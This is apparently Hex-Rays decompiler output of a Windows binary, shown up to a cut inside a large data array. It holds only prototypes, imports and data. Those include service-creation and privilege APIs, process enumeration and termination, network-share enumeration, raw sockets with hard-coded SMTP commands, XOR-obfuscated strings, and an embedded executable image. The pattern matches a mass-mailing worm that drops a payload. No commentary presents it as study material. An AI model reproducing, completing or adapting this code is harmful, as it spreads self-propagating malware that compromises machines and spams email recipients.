/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __cdecl sub_401000(int, int, int, int);
LSTATUS sub_401198();
int __stdcall sub_401284(HKEY hKey, LPCSTR lpSubKey); // idb
int sub_4013A9();
int __stdcall sub_4013FA(DWORD th32ProcessID, int); // idb
void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter);
void *__thiscall sub_40174B(void *this);
LPVOID __thiscall sub_40174E(int this, LPCSTR lpFileName, int, int);
HANDLE __thiscall sub_401808(int this);
char *__cdecl sub_401841(char *Destination);
int __cdecl sub_4018E9(int);
char *__cdecl sub_401A1E(char *Destination);
char *__cdecl sub_401E02(int, int, char *Destination);
char *__cdecl sub_40220C(int, char *Source);
char *__cdecl sub_402319(char *, char *Destination);
char *__cdecl sub_40264B(char *Destination, char *Source, int);
DWORD __cdecl sub_402680(_DWORD *a1);
int __cdecl sub_40284D(LPCSTR lpMachineName, char *Source, SC_HANDLE hSCObject, HKEY phkResult, int, int); // idb
int __thiscall sub_402C3B(void *this, char *Source, int, size_t Size, int);
int __thiscall sub_402D0D(int this);
int __thiscall sub_402D72(int this);
int __thiscall sub_402DCE(int this, char *buf, int len);
int __thiscall sub_402EE0(SOCKET *this);
int __thiscall sub_402F9A(SOCKET *this, char *Source);
int __thiscall sub_403034(SOCKET *this, SOCKET);
char *__thiscall sub_4030BF(char *this, char *Source);
char *__thiscall sub_4030D4(int this, char *Source);
char *__thiscall sub_40317D(void *this, char *Source);
BOOL __thiscall sub_403222(SOCKET *this, int, __int16, int);
int __thiscall sub_40326C(SOCKET *this, char *, int hostshort);
int __thiscall sub_4032CF(SOCKET *this, char *buf, int len, int flags);
int __thiscall sub_4032E6(SOCKET *this, char *buf, int len, int flags);
int __thiscall sub_4032FD(SOCKET *this);
int sub_40330B();
int __stdcall sub_40330F(char *name, int); // idb
char __stdcall sub_4033A1(int, int);
int __cdecl sub_4033F4(char *Destination, char *Source, int, int); // idb
char *__cdecl sub_40347E(char *Str, int);
int __cdecl sub_4034AE(char *Str, int); // idb
int __cdecl sub_4034E0(char *Str, char *Destination, int); // idb
_BYTE *__cdecl sub_4035A1(int);
int __cdecl sub_4035D8(int, int, char *);
int __cdecl sub_403634(int, int, char *);
unsigned int __cdecl sub_403690(int);
int __cdecl sub_40372F(_BYTE *, int, int, int);
int __cdecl sub_403783(char);
int __cdecl sub_4037B9(char);
BOOL __cdecl sub_40380E(BYTE *);
BOOL __cdecl sub_40382F(_BYTE *);
int __cdecl sub_403844(int, char *, int, int, int, int, int); // idb
BOOL __cdecl sub_403A4F(LPCSTR lpFileName, char *Destination, int, int, int);
int __cdecl sub_403BB8(int, int, char *Destination); // idb
int __cdecl sub_403C23(char);
int __cdecl sub_403C7D(char);
char *__cdecl sub_403C88(char *Source, char *);
char *__cdecl sub_403CE3(char *Destination, int);
int __cdecl sub_403D0C(char *Str); // idb
int __cdecl sub_403D4B(char *FullPath); // idb
int __cdecl sub_403DC6(LPCSTR lpFileName, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite); // idb
DWORD __cdecl sub_403E16(LPCSTR lpFileName);
int __cdecl sub_403E63(LPCSTR lpFileName); // idb
char *__cdecl sub_403E97(LPSTR lpTempFileName);
BOOL __cdecl sub_403F05(LPCSTR lpFileName);
int __cdecl sub_403F1C(char *Source, int, int); // idb
int __cdecl sub_40406E(LPCSTR lpFileName, LONG lDistanceToMove); // idb
BOOL __cdecl sub_404138(LPCSTR lpFileName, LPFILETIME lpCreationTime);
BOOL __cdecl sub_404180(LPCSTR lpFileName, FILETIME *lpCreationTime);
LPVOID __cdecl sub_4041C8(LPCSTR lpFileName, int, int);
char *__cdecl sub_404261(char *Destination, int, char *, int);
int __cdecl sub_4043D4(int, int, void *, size_t Size, int); // idb
int __cdecl sub_404555(LPCSTR lpFileName, char *Destination, int, int); // idb
int __cdecl sub_4045EF(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE lpData, HKEY phkResult); // idb
int __cdecl sub_40464B(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, BYTE *lpData); // idb
int __cdecl sub_404691(HKEY hKey, LPCSTR lpSubKey, int, int); // idb
int __cdecl sub_40470F(HKEY hKey, LPCSTR lpSubKey, int, int); // idb
int __cdecl sub_4047B6(int);
HANDLE __cdecl sub_4047E2(LPCSTR lpApplicationName, LPSTR lpCommandLine);
const char *__cdecl sub_404825(LPCSTR lpFileName);
int __cdecl sub_4048B6(HKEY hKey, char *Source, LPCSTR lpValueName, int, int); // idb
int __cdecl sub_40494A(HKEY hKey, char *Source, char *, int, int); // idb
int sub_404A18();
__int16 *__cdecl sub_404B75(__int16 *, __int16);
int __cdecl sub_404BD2(int, char *Destination, char *); // idb
BOOL sub_404C49();
unsigned int __cdecl sub_404CC5(int, unsigned int);
_DWORD *__cdecl sub_404D04(int, unsigned int, unsigned int);
int __cdecl sub_404D74(int, int, int, unsigned int, unsigned int);
int __cdecl sub_404E1A(LPCSTR, LPCSTR lpFileName, int); // idb
int __cdecl sub_404FC5(LPCSTR lpFileName, int); // idb
unsigned int __cdecl sub_4050B5(_WORD *, unsigned int);
_WORD *__cdecl sub_405108(LPCSTR lpFileName);
int __cdecl sub_405173(LPCCH lpMultiByteStr); // idb
__int16 __cdecl sub_4051BE(unsigned __int8 *, int);
int __cdecl sub_405226(LPCSTR lpFileName, LPCVOID lpBuffer, char *Source, int); // idb
int sub_40542A();
int __cdecl sub_405449(HANDLE ProcessHandle, LPCSTR lpName); // idb
HANDLE __cdecl sub_405522(LPCSTR lpFileName);
int sub_4055FE();
const char *__cdecl sub_405705(LPCSTR lpFileName, char *Str);
HMODULE sub_4057BE();
int __cdecl sub_405873(LPCSTR lpFileName); // idb
int __cdecl sub_405B0F(char *FullPath); // idb
int __cdecl sub_405C2E(char *Destination, int); // idb
int __cdecl sub_405C7A(char *FullPath, int); // idb
int __cdecl sub_405E27(char *FullPath, int, int); // idb
int __cdecl sub_405EC6(char *Source); // idb
int __cdecl sub_405F08(int, char *Source, char *, int); // idb
void __stdcall __noreturn sub_406066(LPVOID lpThreadParameter);
BOOL __cdecl sub_4060AE(char *Source, int, int);
int __stdcall sub_406106(int);
int __cdecl sub_4061C0(char *Str, char *Destination); // idb
BOOL __cdecl sub_40620B(char *Destination, char *Str, int);
BOOL __cdecl sub_4062F0(char *, char *Str, int);
BOOL __cdecl sub_4063D4(char *Str, char *);
int __cdecl sub_406426(char *Source); // idb
int sub_406552();
DWORD __stdcall sub_406608(LPVOID lpThreadParameter); // idb
const char *__cdecl sub_406A36(LPCCH lpMultiByteStr, int);
int __cdecl sub_406C65(LPNETRESOURCEA lpNetResource, DWORD dwScope, int); // idb
void __stdcall __noreturn sub_406DDE(LPVOID lpThreadParameter);
int sub_406DFD();
DWORD __stdcall sub_406F88(LPVOID lpThreadParameter); // idb
DWORD __stdcall sub_406FD5(LPVOID lpThreadParameter); // idb
const char *__cdecl sub_40704C(LPCSTR lpFileName, int, int, int);
void __noreturn sub_4071C3();
DWORD __stdcall sub_4071CD(LPVOID lpThreadParameter); // idb
void __noreturn sub_4072F2();
void __stdcall HandlerProc(DWORD dwControl); // idb
void __stdcall sub_4073C3(int, int);
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
unsigned int *__cdecl sub_40745D(int, size_t, int);
_BYTE *__cdecl sub_40756C(int *, unsigned int, size_t *);
// BOOL __stdcall Module32First(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// BOOL __stdcall Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// int __cdecl strcmp(const char *Str1, const char *Str2);
// void *__cdecl memset(void *, int Val, size_t Size);
// char *__cdecl strcpy(char *Destination, const char *Source);
// char *__cdecl strcat(char *Destination, const char *Source);
// size_t __cdecl strlen(const char *Str);
// void __cdecl _splitpath(const char *FullPath, char *Drive, char *Dir, char *Filename, char *Ext);
// int __cdecl toupper(int C);
// int __cdecl tolower(int C);
// int sprintf(char *const Buffer, const char *const Format, ...);
// void __cdecl operator delete(void *Block); idb
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
int __cdecl sub_407F35(int);
// int __cdecl rand();
// void *__cdecl operator new(size_t Size); idb
// int sscanf(const char *const Buffer, const char *const Format, ...);
// void *__cdecl memcpy_0(void *, const void *Src, size_t Size);
// int __cdecl isalpha(int C);
// int __cdecl isdigit(int C);
// char *__cdecl strstr(const char *Str, const char *SubStr);
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
int sub_40C3AB();
// _DWORD __cdecl flsall(_DWORD); weak
// DWORD __stdcall WNetCloseEnum(HANDLE hEnum);
// DWORD __stdcall WNetEnumResourceA(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// DWORD __stdcall WNetOpenEnumA(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEA lpNetResource, LPHANDLE lphEnum);
// char *__cdecl _strupr(char *String);
// int __cdecl _strnicmp(const char *String1, const char *String2, size_t MaxCount);
// int __cdecl _strcmpi(const char *String1, const char *String2);
// char *__cdecl _strlwr(char *String);

//-------------------------------------------------------------------------
// Data declarations

// extern SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *StartServiceCtrlDispatcherA)(const SERVICE_TABLE_ENTRYA *lpServiceStartTable);
// extern BOOL (__stdcall *LookupPrivilegeValueA)(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
// extern BOOL (__stdcall *AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// extern LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegCreateKeyA)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegConnectRegistryA)(LPCSTR lpMachineName, HKEY hKey, PHKEY phkResult);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern BOOL (__stdcall *StartServiceA)(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors);
// extern BOOL (__stdcall *AllocateAndInitializeSid)(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, DWORD nSubAuthority6, DWORD nSubAuthority7, PSID *pSid);
// extern BOOL (__stdcall *EqualSid)(PSID pSid1, PSID pSid2);
// extern BOOL (__stdcall *GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// extern SERVICE_STATUS_HANDLE (__stdcall *RegisterServiceCtrlHandlerA)(LPCSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc);
// extern SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// extern PVOID (__stdcall *FreeSid)(PSID pSid);
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern LSTATUS (__stdcall *RegEnumValueA)(HKEY hKey, DWORD dwIndex, LPSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern SC_HANDLE (__stdcall *CreateServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword);
// extern LSTATUS (__stdcall *RegOpenKeyA)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegEnumKeyA)(HKEY hKey, DWORD dwIndex, LPSTR lpName, DWORD cchName);
// extern LSTATUS (__stdcall *RegDeleteValueA)(HKEY hKey, LPCSTR lpValueName);
// extern BOOL (__stdcall *SetServiceStatus)(SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern BOOL (__stdcall *GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize);
// extern BOOL (__stdcall *IsDBCSLeadByte)(BYTE TestChar);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern UINT (__stdcall *GetTempFileNameA)(LPCSTR lpPathName, LPCSTR lpPrefixString, UINT uUnique, LPSTR lpTempFileName);
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern BOOL (__stdcall *CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// extern BOOL (__stdcall *SetFileAttributesA)(LPCSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern BOOL (__stdcall *FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// extern HANDLE (__stdcall *FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// extern BOOL (__stdcall *SetEndOfFile)(HANDLE hFile);
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
// extern DWORD (__stdcall *GetTempPathA)(DWORD nBufferLength, LPSTR lpBuffer);
// extern BOOL (__stdcall *DeleteFileA)(LPCSTR lpFileName);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern BOOL (__stdcall *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern UINT (__stdcall *GetSystemDirectoryA)(LPSTR lpBuffer, UINT uSize);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern BOOL (__stdcall *SystemTimeToFileTime)(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime);
// extern void (__stdcall *GetSystemTime)(LPSYSTEMTIME lpSystemTime);
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern DWORD (__stdcall *GetVersion)();
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern DWORD (__stdcall *ExpandEnvironmentStringsA)(LPCSTR lpSrc, LPSTR lpDst, DWORD nSize);
// extern UINT (__stdcall *GetDriveTypeA)(LPCSTR lpRootPathName);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern void (__stdcall *GetLocalTime)(LPSYSTEMTIME lpSystemTime);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern DWORD (__stdcall *GetLastError)();
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern BOOL (__stdcall *GetFileTime)(HANDLE hFile, LPFILETIME lpCreationTime, LPFILETIME lpLastAccessTime, LPFILETIME lpLastWriteTime);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern BOOL (__stdcall *UnmapViewOfFile)(LPCVOID lpBaseAddress);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HANDLE (__stdcall *CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// extern LPVOID (__stdcall *MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern BOOL (__stdcall *ReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *SetFileTime)(HANDLE hFile, const FILETIME *lpCreationTime, const FILETIME *lpLastAccessTime, const FILETIME *lpLastWriteTime);
// extern DWORD (__stdcall *GetTickCount)();
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern struct hostent *(__stdcall *gethostbyname)(const char *name);
// extern int (__stdcall *closesocket)(SOCKET s);
// extern int (__stdcall *WSACleanup)();
// extern int (__stdcall *recv)(SOCKET s, char *buf, int len, int flags);
// extern int (__stdcall *send)(SOCKET s, const char *buf, int len, int flags);
// extern u_short (__stdcall *htons)(u_short hostshort);
// extern int (__stdcall *connect)(SOCKET s, const struct sockaddr *name, int namelen);
// extern int (__stdcall *WSAGetLastError)();
// extern int (__stdcall *WSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
// extern SOCKET (__stdcall *socket)(int af, int type, int protocol);
int dword_40D1F0[4] = { 0, 5, 0, 7 }; // weak
int dword_40D204[5] = { 5, 2, 2, 2, 2 }; // weak
_UNKNOWN unk_40D218; // weak
_UNKNOWN unk_40D228; // weak
void *off_40F030 = &unk_410D33; // weak
char Str2[2] = "@"; // idb
char asc_40F038[2] = " "; // idb
char asc_40F03C[2] = ","; // idb
char asc_40F040[3] = "--"; // idb
char asc_40F044[2] = "\\"; // idb
char buf[] = "QUIT\r\n"; // idb
char asc_40F050[] = "\r\n.\r\n"; // idb
char aData[] = "DATA \r\n"; // idb
char asc_40F06C[] = ">\r\n"; // idb
char aMailFrom[] = "MAIL FROM: <"; // idb
char aRcptTo[] = "RCPT TO:<"; // idb
char asc_40F090[] = " \t\r\n"; // idb
char asc_40F098[] = ".,()%$@!`~ "; // idb
char asc_40F0A8[] = ".."; // idb
char asc_40F0AC[] = "."; // idb
char asc_40F0B0[] = "\\*.*"; // idb
char asc_40F0B8[] = "\\\\"; // idb
char String1 = '‰'; // idb
char byte_40F0D0[4] = { '\x06', '\x06', '¼', '\x1B' }; // weak
char aS[4] = "Š\n\n\n"; // idb
char byte_4100D4 = '\x06'; // idb
char byte_4101DC = '\x8D'; // idb
char byte_4101FC = '\x8D'; // idb
char SubKey[8] = "ÒÝŸ\x1BÛ^š_"; // idb
char byte_410310 = '\x14'; // idb
char asc_410354[1] = "^"; // idb
char byte_4103A4 = '\x9D'; // idb
char byte_4103F2 = '\x1C'; // idb
char aOx[4] = "ÒX]^"; // idb
char aSy[4] = "—šÝ]"; // idb
char byte_4105A8 = '\x13'; // idb
char aO_0[1] = "Ö"; // idb
char byte_410766 = '\x14'; // idb
char aZs[3] = "\tžš"; // idb
char aE[1] = "E"; // idb
char aO[2] = "Ó\\"; // idb
CHAR ValueName[5] = "T]^ß_"; // idb
char aUtuwm[5] = "UTUWM"; // idb
char aOy[2] = "ÖÝ"; // idb
char aIO[4] = "\tÍ—Õ"; // idb
char aOy_0[2] = "ÖÝ"; // idb
char asc_4108C1[2] = "^["; // idb
char aE_0[1] = "E"; // idb
char byte_410933 = '\x13'; // idb
char aOtor[4] = "ÕTÖR"; // idb
char aU_0[3] = "Ú]\x1B"; // idb
char aNv[2] = "ÑV"; // idb
char aV[1] = "V"; // idb
CHAR LibFileName[1] = "Ò"; // idb
char aOS[6] = "Ò\\šÞ^]"; // idb
CHAR ProcName[104] =
{
  '’',
  '_',
  'ß',
  '\\',
  'Ú',
  '\x1B',
  '_',
  'š',
  'Ò',
  '_',
  'š',
  '›',
  '\\',
  'Þ',
  '_',
  '\x12',
  'š',
  'Ý',
  'Þ',
  '_',
  'Ú',
  'Ú',
  '\x06',
  '•',
  '_',
  '\x1B',
  'Ò',
  '\x1C',
  '^',
  'š',
  '_',
  'V',
  '\x1F',
  '\x1F',
  '\x06',
  'Ò',
  '\x14',
  '\x17',
  '_',
  '\x1D',
  '_',
  '\x1B',
  '_',
  'Ô',
  '_',
  'X',
  'V',
  '\x06',
  'Ò',
  'Ÿ',
  'Þ',
  'T',
  'Ú',
  '—',
  '\\',
  '\x1D',
  '_',
  '\x12',
  'š',
  'Ý',
  '\x1B',
  '_',
  'Þ',
  '\x1B',
  '_',
  '\x1F',
  '\x06',
  '•',
  '_',
  '\x1B',
  'Ò',
  '\x1C',
  '^',
  'š',
  '_',
  '×',
  '_',
  '\x1B',
  'T',
  '\x9D',
  'Ÿ',
  'Ý',
  '\x06',
  '•',
  '_',
  '\x1B',
  'V',
  '\x1A',
  '\\',
  '–',
  '[',
  'Ÿ',
  'Ÿ',
  '_',
  'š',
  '—',
  'š',
  '_',
  '_',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\x06'
}; // weak
char aW[1] = "W"; // idb
char byte_410D23 = '\x12'; // idb
char aOu[2] = "OÚ"; // idb
char aU_1[4] = "Ú_\x1B["; // idb
_UNKNOWN unk_410DAC; // weak
char String2 = '\x8D'; // idb
CHAR aU[2] = "Û\\"; // idb
CHAR byte_410DF0[20] =
{
  '\x17',
  '\\',
  'š',
  '_',
  'Þ',
  '\x1B',
  'Ý',
  'š',
  'X',
  '\x06',
  '\x1F',
  '\x1D',
  '\x1D',
  'Þ',
  '^',
  'Þ',
  '\x1C',
  '_',
  '\x06',
  '\x06'
}; // weak
char Name[2] = "Ò_"; // idb
char aUzm[5] = "ÛžMœ^"; // idb
char aOyyUS_0[8] = "ÒÝŸ\x1BÛ^š_"; // idb
char aOys[4] = "ÓÝš]"; // idb
char Format[1] = "Ô"; // idb
int dword_41133C = 1; // weak
int dword_411340[1386] =
{
  16,
  29,
  32,
  120,
  136,
  373,
  12,
  389,
  28,
  421,
  83,
  526,
  14,
  566,
  14,
  606,
  14,
  646,
  14,
  664,
  1384,
  2080,
  96,
  4098,
  10,
  4114,
  22,
  4195,
  157,
  5132,
  2292,
  9718,
  522,
  5265997,
  2,
  983044,
  65535,
  184,
  0,
  1704000,
  424,
  234885306,
  -855002081,
  1275181089,
  -1869602355,
  1936287828,
  1869770784,
  1835102823,
  1937075488,
  1700929652,
  1853190688,
  1684960544,
  1461744229,
  842231401,
  925108749,
  17744,
  262476,
  -2062799733,
  0,
  0,
  -2121400096,
  419561739,
  1024,
  3072,
  0,
  4096,
  4096,
  8192,
  4194304,
  4096,
  1024,
  1,
  0,
  655363,
  0,
  24576,
  1024,
  0,
  2,
  1048576,
  8192,
  1048576,
  4096,
  0,
  12304,
  16484,
  1146045200,
  69,
  1048576,
  1048576,
  262144,
  1074266112,
  1156579328,
  4281409,
  0,
  16,
  32,
  4,
  16396,
  1684614848,
  6386785,
  1048576,
  3145728,
  262144,
  1074790400,
  784334848,
  1869374834,
  -167772061,
  17,
  64,
  20,
  16404,
  8644944,
  199753728,
  1778384896,
  714752,
  0,
  637468672,
  4206644,
  808986111,
  2101312,
  1459845120,
  -396321711,
  0,
  767397213,
  -1962934270,
  -2128337828,
  -536870685,
  850759167,
  -402653183,
  214,
  1378571661,
  -2024907379,
  13166814,
  -2117926912,
  1085421,
  12943616,
  -956301296,
  -530055099,
  1170605203,
  1820917764,
  -1654580188,
  57599,
  -396361673,
  0,
  896896349,
  38376,
  1958742784,
  233178402,
  -259325952,
  43240,
  1187472896,
  855638268,
  1364480457,
  1364283473,
  41391615,
  1633222656,
  855638211,
  -1191234816,
  27298,
  -395545203,
  90,
  -65047472,
  1972238475,
  -1403679323,
  735663403,
  267518962,
  1459375799,
  -1956731661,
  -166987658,
  -1017581707,
  3342300,
  395160713,
  -2293796,
  -863197055,
  -71913700,
  9222028,
  -2282423,
  -1961036580,
  1072654547,
  -1785942132,
  1780721886,
  -2294261,
  -192830331,
  1996438556,
  1829116,
  -949616640,
  64582,
  1591148374,
  -1661188465,
  -62488218,
  48786076,
  -1660944384,
  1449196739,
  -61437089,
  257491050,
  1712312740,
  -1036818771,
  -136139930,
  758236001,
  -1320091528,
  758197721,
  -1604030415,
  509704052,
  483281400,
  -1408195499,
  741420530,
  1260017969,
  2004620976,
  1857739844,
  1274162701,
  1751193008,
  1840957508,
  -1494077879,
  -30269087,
  654844602,
  1656420420,
  695931957,
  -469573564,
  1932567125,
  636923503,
  625342010,
  -985376580,
  -758197677,
  -973976404,
  758197553,
  -2106482583,
  158705249,
  -1783520735,
  506539313,
  758247153,
  1691156607,
  -537846175,
  -54099369,
  -563708808,
  -1028492646,
  -1503038411,
  -567145151,
  -567141446,
  2086731522,
  1948876042,
  1868568901,
  757056865,
  -798610127,
  555049402,
  1922976707,
  2144622697,
  1438284411,
  583675413,
  -1503250042,
  -701353655,
  782645690,
  2042131170,
  1953180094,
  -295114541,
  2010007395,
  -314867251,
  -50120379,
  -941611647,
  -542102718,
  -1073107439,
  -549132849,
  2007223002,
  1380273091,
  860636494,
  -811988174,
  -367827659,
  539406794,
  -826440181,
  -1819879047,
  -1029395602,
  -517600535,
  116895384,
  -567273241,
  871930566,
  -1643349585,
  -2018384917,
  1319410241,
  -1366527561,
  -184879449,
  703995353,
  1140850902,
  1282927088,
  -1921521171,
  2054678827,
  2004346981,
  -931665797,
  -1703417690,
  1920460977,
  1417144483,
  444065928,
  427288786,
  -59250480,
  -1267209890,
  41412874,
  1366813057,
  360179964,
  427289112,
  -730339012,
  -898111347,
  611838027,
  595060877,
  276294016,
  1652025701,
  1954015583,
  293070923,
  -1837635161,
  444066105,
  -1502090849,
  -696784704,
  -831002138,
  -713561177,
  796388268,
  1937238958,
  1680761702,
  -1593807764,
  -754974684,
  1299617833,
  1680757328,
  -754946964,
  1924395763,
  1845493762,
  -881522288,
  -1233843824,
  1433733434,
  861029715,
  -94097870,
  9349947,
  -510472448,
  -515963785,
  -1593835401,
  15228932,
  1560281088,
  -1248993397,
  3879,
  -155160,
  1518604287,
  855638020,
  -2054334986,
  1136,
  1690317648,
  -1989922561,
  -1778428128,
  -192,
  80,
  0,
  3213312,
  258048,
  27875072,
  1946157056,
  -18840821,
  -1778428080,
  -188,
  1780640342,
  23746051,
  104,
  -1778427968,
  -196,
  92540736,
  1207959556,
  -191001264,
  1392508943,
  1393083267,
  1393083267,
  1284898640,
  1375731711,
  611647316,
  1419116296,
  1509949439,
  -1148973248,
  1207959555,
  -2062563061,
  946,
  -947808432,
  9030,
  1784043350,
  1962890756,
  -1778444252,
  -168,
  -2079342581,
  889,
  1448499024,
  -11533718,
  -41835,
  264244223,
  220804,
  -1517727744,
  1050,
  1102417299,
  -402653176,
  -810,
  1284207476,
  -108984284,
  8192,
  53379599,
  56623104,
  -2083836984,
  -125105943,
  1970432440,
  66028403,
  200990895,
  712335817,
  -473936501,
  -2134941653,
  721420290,
  1373408231,
  -9809065,
  1077703935,
  6947178,
  1485592063,
  -16749996,
  199689168,
  -2062589504,
  740,
  340834063,
  1410356363,
  2055328515,
  1852397328,
  1712092506,
  1762949761,
  -981201040,
  855638018,
  1941278207,
  -402653176,
  -946,
  51137163,
  -242546614,
  50588097,
  608975822,
  -1585049848,
  50331650,
  1379828211,
  1948349025,
  678988748,
  141800845,
  535298048,
  738197500,
